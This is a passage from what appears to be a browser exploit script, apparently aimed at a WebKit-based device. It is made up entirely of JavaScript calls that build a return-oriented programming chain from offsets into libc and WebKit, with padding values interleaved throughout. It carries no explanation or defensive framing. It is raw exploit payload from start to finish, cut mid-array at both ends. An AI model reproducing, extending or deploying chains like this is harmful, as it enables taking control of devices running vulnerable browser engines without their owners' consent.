libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+302616, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+302768, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+302784, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+302752, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1506828, 
libc_base+793877, 
ropchain+302888, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+302904, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+303072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+303040, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+303056, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(webkit_base+105267,); 
db([0, 0]); 
set_gadgets([
webkit_base+7047212, 
libc_base+877175, 
libc_base+793877, 
ropchain+303200, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+303232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+303216, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+303400, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+303416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+303384, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+303520, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+303568, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+303536, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+303680, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+303672, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+303696, 
ropchain+303712, 
libc_base+811575, 
ropchain+303728, 
libc_base+811575, 
ropchain+305480, 
libc_base+50775, 
libc_base+793877, 
ropchain+303768, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+303896, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+303880, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+303992, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+304072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+304128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+304208, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+304312, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+304328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+304488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+304456, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+304440, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+304560, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+304576, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+304664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+304720, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+304792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+304848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+304936, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+305040, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+305056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+305200, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+305168, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+305184, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+305288, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+305344, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+305424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+301232, 
libc_base+50775, 
libc_base+793877, 
ropchain+305520, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+305656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+305704, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+305672, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+305816, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+305808, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+305832, 
ropchain+305848, 
libc_base+811575, 
ropchain+300968, 
libc_base+759626, 
libc_base+793877, 
ropchain+305904, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+305984, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+306040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+306120, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+306224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+306240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+306392, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+306424, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+306408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+306376, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+306496, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+306512, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+306608, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+306592, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+306736, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+306888, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+306904, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+306872, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1506828, 
libc_base+793877, 
ropchain+307008, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+307024, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+307192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+307160, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+307176, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(webkit_base+105267,); 
db([0, 0]); 
set_gadgets([
webkit_base+7047212, 
libc_base+877175, 
libc_base+793877, 
ropchain+307376, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+307328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+307360, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+307448, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+307464, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+307552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+307608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+307728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+307760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+307744, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+307904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+307872, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+307888, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+307984, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+308112, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+308096, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+308192, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+308296, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+308312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+308464, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+308496, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+308480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+308448, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+308568, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+308584, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+308680, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+308664, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+308808, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+308960, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+308976, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+308944, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1506828, 
libc_base+793877, 
ropchain+309080, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+309096, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+309264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+309232, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+309248, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(webkit_base+105267,); 
db([0, 0]); 
set_gadgets([
webkit_base+7047212, 
libc_base+877877, 
libc_base+793877, 
ropchain+309392, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+309424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+309408, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877546, 
libc_base+793877, 
ropchain+309512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+309568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+309696, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+309776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+309832, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+309912, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+310016, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+310032, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+310184, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+310216, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+310200, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+310168, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+310288, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+310304, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+310400, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+310384, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+310528, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+310680, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+310696, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+310664, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1506828, 
libc_base+793877, 
ropchain+310800, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+310816, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+310984, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+310952, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+310968, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(webkit_base+105267,); 
db([0, 0]); 
set_gadgets([
webkit_base+7047212, 
libc_base+877175, 
libc_base+793877, 
ropchain+311168, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+311120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+311152, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+311240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+311256, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+311344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+311400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+311472, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+311528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877, 
ropchain+311632, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([16, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+311792, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+312560, 
libc_base+882884, 
libc_base+793877, 
ropchain+311904, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+311920, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+311888, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+312016, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+312000, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([3, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+312216, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+313888, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+312328, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+312312, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
